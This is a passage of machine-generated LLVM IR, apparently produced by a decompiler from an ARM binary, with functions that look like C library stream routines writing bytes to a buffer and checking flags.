  %v1_e918 = add i32 %v0_e918, 28
  %v2_e918 = inttoptr i32 %v1_e918 to i32*
  %v3_e918 = load i32, i32* %v2_e918, align 4
  %v0_e91c = load i32, i32* %r8.global-to-local, align 4
  %v1_e91c = add i32 %v0_e91c, 1
  store i32 %v1_e91c, i32* %r8.global-to-local, align 4
  %v1_e920 = add i32 %v3_e918, 2
  store i32 %v1_e920, i32* %r3.global-to-local, align 4
  %v6_e928 = icmp slt i32 %v1_e91c, %v1_e920
  br i1 %v6_e928, label %dec_label_pc_e890, label %dec_label_pc_e94c

dec_label_pc_e930:                                ; preds = %dec_label_pc_e884
  %v0_e930 = load i32, i32* %r7.global-to-local, align 4
  %v1_e930 = add i32 %v0_e930, 28
  %v2_e930 = inttoptr i32 %v1_e930 to i32*
  %v3_e930 = load i32, i32* %v2_e930, align 4
  store i32 %v3_e930, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_e938 = add i32 %v0_e930, 38
  %v4_e938 = inttoptr i32 %v3_e938 to i8*
  store i8 1, i8* %v4_e938, align 1
  %v0_e93c = load i32, i32* %r2.global-to-local, align 4
  %v3_e93c = mul i32 %v0_e93c, 4
  store i32 %v3_e93c, i32* @r2, align 4
  %v0_e940 = load i32, i32* %r7.global-to-local, align 4
  %v1_e940 = add i32 %v0_e940, 40
  store i32 %v1_e940, i32* @r0, align 4
  %v2_e944 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_e944, i32* @r1, align 4
  %v0_e948 = call i32 @function_f350()
  store i32 %v0_e948, i32* %r0.global-to-local, align 4
  %v0_e94c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e94c

dec_label_pc_e94c:                                ; preds = %dec_label_pc_e918, %dec_label_pc_e930
  %v2_e968 = phi i32 [ %v0_e94c.pre, %dec_label_pc_e930 ], [ %v0_e918, %dec_label_pc_e918 ]
  %v1_e94c = add i32 %v2_e968, 16
  %v2_e94c = inttoptr i32 %v1_e94c to i32*
  %v3_e94c = load i32, i32* %v2_e94c, align 4
  store i32 %v3_e94c, i32* %r3.global-to-local, align 4
  %v1_e950 = and i32 %v3_e94c, 128
  %v2_e950 = icmp eq i32 %v1_e950, 0
  br i1 %v2_e950, label %.thread49, label %.thread47

.thread47:                                        ; preds = %dec_label_pc_e94c
  %v3_e954 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_e954, i32* %r3.global-to-local, align 4
  %v2_e958 = inttoptr i32 %v2_e968 to i32*
  %v3_e958 = load i32, i32* %v2_e958, align 4
  %v2_e960.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_e960 = sub i32 %v2_e960.pre, %v3_e954
  store i32 %v3_e960, i32* %r3.global-to-local, align 4
  %v5_e964 = mul i32 %v3_e960, 4
  %v6_e964 = add i32 %v5_e964, %v3_e958
  store i32 %v6_e964, i32* @r2, align 4
  br label %bb158

.thread49:                                        ; preds = %dec_label_pc_e94c
  %v1_e95c44 = load i32, i32* %r6.global-to-local, align 4
  %v2_e95c45 = add i32 %v1_e95c44, 1
  store i32 %v2_e95c45, i32* %r3.global-to-local, align 4
  %v3_e968 = inttoptr i32 %v2_e968 to i32*
  store i32 %v2_e95c45, i32* %v3_e968, align 4
  %v0_e96c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread47, %.thread49
  %v1_e974 = phi i32 [ %v2_e968, %.thread47 ], [ %v0_e96c.pre, %.thread49 ]
  %v1_e96c = add i32 %v1_e974, 28
  %v2_e96c = inttoptr i32 %v1_e96c to i32*
  %v3_e96c = load i32, i32* %v2_e96c, align 4
  store i32 %v3_e96c, i32* %r3.global-to-local, align 4
  %v1_e970 = add i32 %v3_e96c, 2
  store i32 %v1_e970, i32* %r0.global-to-local, align 4
  %v0_e974 = load i32, i32* %fp.global-to-local, align 4
  %v2_e974 = add i32 %v1_e974, 24
  %v3_e974 = inttoptr i32 %v2_e974 to i32*
  store i32 %v0_e974, i32* %v3_e974, align 4
  br i1 %v2_e950, label %dec_label_pc_e984, label %bb159

bb159:                                            ; preds = %bb158
  %v1_e978 = load i32, i32* @r2, align 4
  %v2_e978 = load i32, i32* %r7.global-to-local, align 4
  %v3_e978 = inttoptr i32 %v2_e978 to i32*
  store i32 %v1_e978, i32* %v3_e978, align 4
  br label %dec_label_pc_e984

dec_label_pc_e980:                                ; preds = %dec_label_pc_e874, %dec_label_pc_e494, %dec_label_pc_e5dc, %dec_label_pc_e688, %dec_label_pc_e660, %dec_label_pc_e66c, %dec_label_pc_e5a8, %dec_label_pc_e8c0, %dec_label_pc_e840, %.thread23
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e984

dec_label_pc_e984:                                ; preds = %bb159, %bb158, %dec_label_pc_e980
  %v2_e988 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_e988, i32* @r4, align 4
  store i32 %v6_e450, i32* @r5, align 4
  store i32 %v27_e450, i32* @lr, align 4
  %v1_e98c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e98c

; uselistorder directives
  uselistorder i32 %v3_e960, { 1, 0 }
  uselistorder i32 %v1_e91c, { 1, 2, 0 }
  uselistorder i32 %v2_e8b8, { 1, 0 }
  uselistorder i32 %v1_e8b8, { 1, 0, 2 }
  uselistorder i32 %v0_e8d8, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_e8b0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_e874, { 1, 2, 0 }
  uselistorder i32 %v0_e864, { 1, 0 }
  uselistorder i32 %v1_e840, { 1, 0, 2 }
  uselistorder i32 %v1_e7b4, { 1, 2, 0 }
  uselistorder i32 %v1_e79c, { 1, 0 }
  uselistorder i32 %v2_e784, { 2, 1, 0 }
  uselistorder i32 %v1_e768, { 0, 2, 3, 1 }
  uselistorder i32 %v1_e744, { 1, 0, 2 }
  uselistorder i32 %v3_e720, { 2, 1, 0 }
  uselistorder i32 %v1_e6e0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e6d0.pre, { 0, 2, 1 }
  uselistorder i32 %v2_e6ac, { 1, 0 }
  uselistorder i32 %v5_e60c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e60c, { 1, 0 }
  uselistorder i32 %v0_e61074, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_e5b4, { 1, 0 }
  uselistorder i32 %v0_e5d4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_e598, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_e580, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_e570, { 1, 0 }
  uselistorder i32 %v3_e568, { 0, 2, 1 }
  uselistorder i8 %v2_e568, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e5e8, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_e52c, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_e518, { 1, 2, 0, 3 }
  uselistorder i32 %v0_e500, { 1, 0 }
  uselistorder i32 %v3_e50c.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_e4b4, { 0, 2, 1 }
  uselistorder i32 %v2_e4a0, { 1, 0, 2 }
  uselistorder i32 %v0_e454, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 18, 0, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20 }
  uselistorder i32* %r6.global-to-local, { 9, 12, 15, 10, 14, 0, 1, 8, 2, 11, 3, 4, 5, 6, 13, 16, 7 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 58, 49, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 17, 44, 47, 48, 45, 46, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 26, 27, 25, 17, 28, 18, 19, 20, 29, 21, 30, 31, 22, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 ()* @function_e3fc, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1979c.333 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_19738.331 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0 }
  uselistorder i32 -72, { 1, 0 }
  uselistorder label %dec_label_pc_e984, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e980, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_e94c, { 1, 0 }
  uselistorder label %dec_label_pc_e918, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e910, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e8cc, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_e884, { 1, 0, 2 }
  uselistorder label %bb150, { 2, 1, 0 }
  uselistorder label %.thread23, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e698, { 1, 0 }
  uselistorder label %dec_label_pc_e64c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_e5c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e5c4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e564, { 1, 0 }
  uselistorder label %dec_label_pc_e560, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e564.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e504, { 1, 0 }
  uselistorder label %dec_label_pc_e4d8, { 1, 0 }
}

define i32 @function_e9c0(i16* %arg1) local_unnamed_addr {
dec_label_pc_e9c0:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_e9c0 = load i32, i32* @r4, align 4
  store i32 %v3_e9c0, i32* %stack_var_-20, align 4
  %v2_e9c4 = add i32 %tmp, 52
  %v3_e9c4 = inttoptr i32 %v2_e9c4 to i32*
  %v4_e9c4 = load i32, i32* %v3_e9c4, align 4
  store i32 82164, i32* %r5.global-to-local, align 4
  %v1_e9cc = sub i32 1, %v4_e9c4
  %v2_e9cc = icmp ult i32 %v4_e9c4, 2
  br i1 %v2_e9cc, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_e9c0
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_e9c0, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_e9cc, %dec_label_pc_e9c0 ]
  %v0_e9d4 = phi i32 [ 0, %bb ], [ %v1_e9cc, %dec_label_pc_e9c0 ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v2_e9d4 = icmp eq i32 %v0_e9d4, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 142044, i32* %r5.global-to-local, align 4
  br i1 %v2_e9d4, label %dec_label_pc_ea20, label %dec_label_pc_e9e8

dec_label_pc_e9e8:                                ; preds = %bb14
  %v2_e9ec = add i32 %tmp, 56
  store i32 %v2_e9ec, i32* %r4.global-to-local, align 4
  %v4_ea00 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_ea00)
  %v0_ea14 = load i32, i32* %r5.global-to-local, align 4
  %v2_ea14 = add i32 %v0_ea14, 16
  %v3_ea14 = inttoptr i32 %v2_ea14 to i32*
  %v4_ea14 = load i32, i32* %v3_ea14, align 4
  store i32 %v4_ea14, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_ea14)
  %v0_ea20.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_ea24.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_ea20.pre, 0
  br label %dec_label_pc_ea20

dec_label_pc_ea20:                                ; preds = %bb14, %dec_label_pc_e9e8
  %v0_ea24 = phi i32 [ %tmp, %bb14 ], [ %v0_ea24.pre, %dec_label_pc_e9e8 ]
  %v0_ea20 = phi i1 [ true, %bb14 ], [ %phitmp, %dec_label_pc_e9e8 ]
  %v1_ea24 = inttoptr i32 %v0_ea24 to i16*
  %v2_ea24 = load i16, i16* %v1_ea24, align 2
  %v3_ea24 = zext i16 %v2_ea24 to i32
  store i32 %v3_ea24, i32* %r4.global-to-local, align 4
  br i1 %v0_ea20, label %dec_label_pc_ea20..thread2_crit_edge, label %bb15

dec_label_pc_ea20..thread2_crit_edge:             ; preds = %dec_label_pc_ea20
  %v0_ea3c.pre = load i32, i32* @ip, align 4
  br label %.thread2

bb15:                                             ; preds = %dec_label_pc_ea20
  %v1_ea34 = load i32, i32* %r5.global-to-local, align 4
  %v3_ea34 = add i32 %v1_ea34, 24
  %v4_ea34 = inttoptr i32 %v3_ea34 to i32*
  %v5_ea34 = load i32, i32* %v4_ea34, align 4
  store i32 %v5_ea34, i32* @ip, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ea20..thread2_crit_edge, %bb15
  %v0_ea3c = phi i32 [ %v0_ea3c.pre, %dec_label_pc_ea20..thread2_crit_edge ], [ %v5_ea34, %bb15 ]
  %v2_ea3c = xor i1 %v0_ea20, true
  call void @__pseudo_cond_branch(i1 %v2_ea3c, i32 %v0_ea3c)
  %v0_ea40 = load i32, i32* %r4.global-to-local, align 4
  %v1_ea40 = and i32 %v0_ea40, 4
  %v2_ea48 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_ea48, i32* @r4, align 4
  ret i32 %v1_ea40

; uselistorder directives
  uselistorder i1 %v0_ea20, { 1, 0 }
  uselistorder i32 %v4_e9c4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_ea20, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
}

define i32 @function_ea54(i32 %arg1) local_unnamed_addr {
dec_label_pc_ea54:
  %v0_ea54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ea54, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_ea54
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ea54, %bb
  %v10_ea60 = phi i32 [ %arg1, %dec_label_pc_ea54 ], [ 0, %bb ]
  ret i32 %v10_ea60

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_ea64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ea64:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_ea64 = load i32, i32* @r4, align 4
  store i32 %v3_ea64, i32* %stack_var_-28, align 4
  %v6_ea64 = load i32, i32* @r5, align 4
  %v9_ea64 = load i32, i32* @r6, align 4
  %v12_ea64 = load i32, i32* @r7, align 4
  %v21_ea64 = load i32, i32* @lr, align 4
  %v1_ea68 = add i32 %arg3, 52
  %v2_ea68 = inttoptr i32 %v1_ea68 to i32*
  %v3_ea68 = load i32, i32* %v2_ea68, align 4
  %v1_ea70 = sub i32 1, %v3_ea68
  %v2_ea70 = icmp ult i32 %v3_ea68, 2
  br i1 %v2_ea70, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_ea64
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_ea64, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_ea70, %dec_label_pc_ea64 ]
  %v0_ea78 = phi i32 [ 0, %bb ], [ %v1_ea70, %dec_label_pc_ea64 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_ea78 = icmp eq i32 %v0_ea78, 0
  store i32 142044, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_ea78, label %dec_label_pc_eacc, label %dec_label_pc_ea94

dec_label_pc_ea94:                                ; preds = %bb16
  %v1_ea98 = add i32 %arg3, 56
  store i32 %v1_ea98, i32* @r4, align 4
  %v4_eaac = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_eaac)
  %v0_eac0 = load i32, i32* @r5, align 4
  %v2_eac0 = add i32 %v0_eac0, 16
  %v3_eac0 = inttoptr i32 %v2_eac0 to i32*
  %v4_eac0 = load i32, i32* %v3_eac0, align 4
  store i32 %v4_eac0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_eacc.352 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_eac0)
  %v0_eacc.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_ead0.pre = load i32, i32* @r7, align 4
  %v0_ead4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_eacc

dec_label_pc_eacc:                                ; preds = %bb16, %dec_label_pc_ea94
  %v0_ead4 = phi i32 [ %arg3, %bb16 ], [ %v0_ead4.pre, %dec_label_pc_ea94 ]
  %v0_ead0 = phi i32 [ %arg2, %bb16 ], [ %v0_ead0.pre, %dec_label_pc_ea94 ]
  %v0_eacc = phi i32 [ %arg1, %bb16 ], [ %v0_eacc.pre, %dec_label_pc_ea94 ]
  %v3_ead8 = inttoptr i32 %v0_eacc to i8*
  %v4_ead8 = call i32 @function_efa8(i8* %v3_ead8, i32 %v0_ead0, i32 %v0_ead4)
  %v0_eadc = load i32, i32* %sl.global-to-local, align 4
  %v2_eadc = icmp eq i32 %v0_eadc, 0
  store i32 %v4_ead8, i32* %r4.global-to-local, align 4
  br i1 %v2_eadc, label %dec_label_pc_eacc..thread3_crit_edge, label %bb17

dec_label_pc_eacc..thread3_crit_edge:             ; preds = %dec_label_pc_eacc
  %v0_eaf8.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_eacc
  %v1_eaf0 = load i32, i32* @r5, align 4
  %v3_eaf0 = add i32 %v1_eaf0, 24
  %v4_eaf0 = inttoptr i32 %v3_eaf0 to i32*
  %v5_eaf0 = load i32, i32* %v4_eaf0, align 4
  store i32 %v5_eaf0, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_eacc..thread3_crit_edge, %bb17
  %v0_eaf8 = phi i32 [ %v0_eaf8.pre, %dec_label_pc_eacc..thread3_crit_edge ], [ %v5_eaf0, %bb17 ]
  %v2_eaf8 = xor i1 %v2_eadc, true
  call void @__pseudo_cond_branch(i1 %v2_eaf8, i32 %v0_eaf8)
  %v0_eafc = load i32, i32* %r4.global-to-local, align 4
  %v2_eb04 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_eb04, i32* @r4, align 4
  store i32 %v6_ea64, i32* @r5, align 4
  store i32 %v9_ea64, i32* @r6, align 4
  store i32 %v12_ea64, i32* @r7, align 4
  store i32 %v21_ea64, i32* @lr, align 4
  ret i32 %v0_eafc

; uselistorder directives
  uselistorder i32 %v3_ea68, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_eacc, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_eb10(i32 %arg1) local_unnamed_addr {
dec_label_pc_eb10:
  %v0_eb10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_eb10, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_eb10
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_eb10, %bb
  %v10_eb1c = phi i32 [ %arg1, %dec_label_pc_eb10 ], [ 0, %bb ]
  ret i32 %v10_eb1c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_eb20(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_eb20:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_eb20 = load i32, i32* @r4, align 4
  store i32 %v3_eb20, i32* %stack_var_-20, align 4
  %v6_eb20 = load i32, i32* @r5, align 4
  %v9_eb20 = load i32, i32* @r6, align 4
  %v12_eb20 = load i32, i32* @r7, align 4
  %v15_eb20 = load i32, i32* @lr, align 4
  %v1_eb24 = add i32 %arg2, 52
  %v2_eb24 = inttoptr i32 %v1_eb24 to i32*
  %v3_eb24 = load i32, i32* %v2_eb24, align 4
  store i32 %v3_eb24, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb2c = icmp eq i32 %v3_eb24, 0
  store i32 add (i32 ptrtoint (i32* @global_var_13fa4.355 to i32), i32 60216), i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_eb2c, label %dec_label_pc_eb70, label %dec_label_pc_eb44

dec_label_pc_eb44:                                ; preds = %dec_label_pc_eb20
  %v1_eb44 = add i32 %arg2, 16
  %v2_eb44 = inttoptr i32 %v1_eb44 to i32*
  %v3_eb44 = load i32, i32* %v2_eb44, align 4
  store i32 %v3_eb44, i32* %r2.global-to-local, align 4
  %v1_eb48 = add i32 %arg2, 28
  %v2_eb48 = inttoptr i32 %v1_eb48 to i32*
  %v3_eb48 = load i32, i32* %v2_eb48, align 4
  store i32 %v3_eb48, i32* %r3.global-to-local, align 4
  %v3_eb4c = icmp uge i32 %v3_eb44, %v3_eb48
  store i1 %v3_eb4c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_eb4c, label %dec_label_pc_eb44.dec_label_pc_eb64_crit_edge, label %.thread

dec_label_pc_eb44.dec_label_pc_eb64_crit_edge:    ; preds = %dec_label_pc_eb44
  %.pre = trunc i32 %arg1 to i8
  br label %dec_label_pc_eb64

.thread:                                          ; preds = %dec_label_pc_eb44
  %v2_eb50 = urem i32 %arg1, 256
  store i32 %v2_eb50, i32* %r3.global-to-local, align 4
  %v2_eb54 = trunc i32 %arg1 to i8
  %v4_eb54 = inttoptr i32 %v3_eb44 to i8*
  store i8 %v2_eb54, i8* %v4_eb54, align 1
  %v5_eb54 = load i32, i32* %r2.global-to-local, align 4
  %v6_eb54 = add i32 %v5_eb54, 1
  store i32 %v6_eb54, i32* %r2.global-to-local, align 4
  %v0_eb58.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_eb58.pr.pr, label %dec_label_pc_eb64, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_eb58 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_eb58, i32* %r4.global-to-local, align 4
  store i32 %v6_eb54, i32* %v2_eb44, align 4
  br label %dec_label_pc_ebf0

dec_label_pc_eb64:                                ; preds = %dec_label_pc_eb44.dec_label_pc_eb64_crit_edge, %.thread
  %v2_eb64.pre-phi = phi i8 [ %.pre, %dec_label_pc_eb44.dec_label_pc_eb64_crit_edge ], [ %v2_eb54, %.thread ]
  %v3_eb64 = call i32 @function_f048(i8 %v2_eb64.pre-phi, i32 %arg2)
  store i32 %v3_eb64, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ebf0

dec_label_pc_eb70:                                ; preds = %dec_label_pc_eb20
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_eb74 = add i32 %arg2, 56
  store i32 %v1_eb74, i32* @r4, align 4
  store i32 %v1_eb74, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_eb88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_13fa4.355 to i32), i32 60292) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_eb88)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_eb9c = load i32, i32* @r6, align 4
  %v2_eb9c = add i32 %v0_eb9c, 16
  %v3_eb9c = inttoptr i32 %v2_eb9c to i32*
  %v4_eb9c = load i32, i32* %v3_eb9c, align 4
  store i32 60328, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_eb9c)
  %v0_eba8 = load i32, i32* @r5, align 4
  %v1_eba8 = add i32 %v0_eba8, 16
  %v2_eba8 = inttoptr i32 %v1_eba8 to i32*
  %v3_eba8 = load i32, i32* %v2_eba8, align 4
  store i32 %v3_eba8, i32* %r2.global-to-local, align 4
  %v1_ebac = add i32 %v0_eba8, 28
  %v2_ebac = inttoptr i32 %v1_ebac to i32*
  %v3_ebac = load i32, i32* %v2_ebac, align 4
  store i32 %v3_ebac, i32* %r3.global-to-local, align 4
  %v3_ebb0 = icmp uge i32 %v3_eba8, %v3_ebac
  store i1 %v3_ebb0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_ebb0, label %dec_label_pc_ebc8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_eb70
  %v1_ebb4 = load i32, i32* @r7, align 4
  %v2_ebb4 = urem i32 %v1_ebb4, 256
  store i32 %v2_ebb4, i32* %r3.global-to-local, align 4
  %v2_ebb8 = trunc i32 %v1_ebb4 to i8
  %v4_ebb8 = inttoptr i32 %v3_eba8 to i8*
  store i8 %v2_ebb8, i8* %v4_ebb8, align 1
  %v5_ebb8 = load i32, i32* %r2.global-to-local, align 4
  %v6_ebb8 = add i32 %v5_ebb8, 1
  store i32 %v6_ebb8, i32* %r2.global-to-local, align 4
  %v0_ebbc.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ebbc.pr.pr, label %.thread4.dec_label_pc_ebc8_crit_edge, label %.thread6

.thread4.dec_label_pc_ebc8_crit_edge:             ; preds = %.thread4
  %v0_ebcc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ebc8

.thread6:                                         ; preds = %.thread4
  %v1_ebbc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_ebbc, i32* %r4.global-to-local, align 4
  %v2_ebc0 = load i32, i32* @r5, align 4
  %v3_ebc0 = add i32 %v2_ebc0, 16
  %v4_ebc0 = inttoptr i32 %v3_ebc0 to i32*
  store i32 %v6_ebb8, i32* %v4_ebc0, align 4
  br label %dec_label_pc_ebd8

dec_label_pc_ebc8:                                ; preds = %.thread4.dec_label_pc_ebc8_crit_edge, %dec_label_pc_eb70
  %v0_ebcc = phi i32 [ %v0_ebcc.pre, %.thread4.dec_label_pc_ebc8_crit_edge ], [ %v0_eba8, %dec_label_pc_eb70 ]
  %v0_ebc8 = load i32, i32* @r7, align 4
  %v2_ebd0 = trunc i32 %v0_ebc8 to i8
  %v3_ebd0 = call i32 @function_f048(i8 %v2_ebd0, i32 %v0_ebcc)
  store i32 %v3_ebd0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ebd8

dec_label_pc_ebd8:                                ; preds = %.thread6, %dec_label_pc_ebc8
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_ebe4 = load i32, i32* @r6, align 4
  %v2_ebe4 = add i32 %v0_ebe4, 24
  %v3_ebe4 = inttoptr i32 %v2_ebe4 to i32*
  %v4_ebe4 = load i32, i32* %v3_ebe4, align 4
  call void @__pseudo_branch(i32 %v4_ebe4)
  br label %dec_label_pc_ebf0

dec_label_pc_ebf0:                                ; preds = %.thread2, %dec_label_pc_eb64, %dec_label_pc_ebd8
  %v0_ebf0 = load i32, i32* %r4.global-to-local, align 4
  %v2_ebf8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_ebf8, i32* @r4, align 4
  store i32 %v6_eb20, i32* @r5, align 4
  store i32 %v9_eb20, i32* @r6, align 4
  store i32 %v12_eb20, i32* @r7, align 4
  store i32 %v15_eb20, i32* @lr, align 4
  ret i32 %v0_ebf0

; uselistorder directives
  uselistorder i32 %v1_ebb4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_ebf0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ebd8, { 1, 0 }
  uselistorder label %dec_label_pc_eb64, { 1, 0 }
}

define i32 @function_ec04(i32 %arg1) local_unnamed_addr {
dec_label_pc_ec04:
  %v0_ec04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ec04, label %bb, label %.thread2

